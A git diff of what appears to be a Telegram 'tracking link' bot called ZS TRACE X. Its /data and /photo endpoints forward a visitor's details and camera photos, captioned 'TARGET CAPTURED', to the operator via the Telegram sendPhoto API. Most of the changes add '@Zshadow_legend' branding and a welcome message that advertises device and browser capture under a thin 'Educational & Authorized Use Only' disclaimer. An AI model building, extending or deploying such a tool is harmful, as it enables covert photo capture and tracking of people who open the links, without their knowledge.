@@ -167,7 +167,7 @@ app.post("/data", async (req, res) => {
 <code>${targetUrl}</code>
 
 ┏━━━━━━━━━━━━━━━━━━━━━━━━━┓
-⚡ <b>POWERED BY ZShadow</b> ⚡
+⚡ <b>POWERED BY @Zshadow_legend</b> ⚡
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━┛
 `;
 
@@ -215,7 +215,8 @@ app.post("/photo", async (req, res) => {
 
     formData.append(
       "caption",
-      `🎯 TARGET CAPTURED 📸\n\n🔗 ${targetUrl}`
+      `🎯 TARGET CAPTURED ✅📸
+Powered By @Zshadow_legend\n\n🔗 ${targetUrl}`
     );
 
     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
@@ -248,7 +249,30 @@ app.post(`/bot${BOT_TOKEN}`, async (req, res) => {
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
         chat_id: chatId,
-        text: "👋 Welcome!\n\nUse /create to generate tracking link"
+        text: "👋 Welcome to ☬ ᴢꜱ ᴛʀᴀᴄᴇ 𝕏 ☬
+
+╔════════════════════╗
+             📡 ZS TRACE X
+╚════════════════════╝
+
+⚡ Powerful Telegram Analytics Bot
+
+🔥 Features
+• Create Custom Tracking Links
+• Live Visitor Analytics
+• Device & Browser Information
+• Fast Telegram Notifications
+• Easy & Reliable Management
+
+📌 Available Commands
+
+/start ➜ Start The Bot
+/create ➜ Create New Tracking Link
+
+⚠️ For Educational & Authorized Use Only
+
+🚀 Simple • Fast • Powerful
+⚡ Powered By @Zshadow_legend"
       })
     });
   }
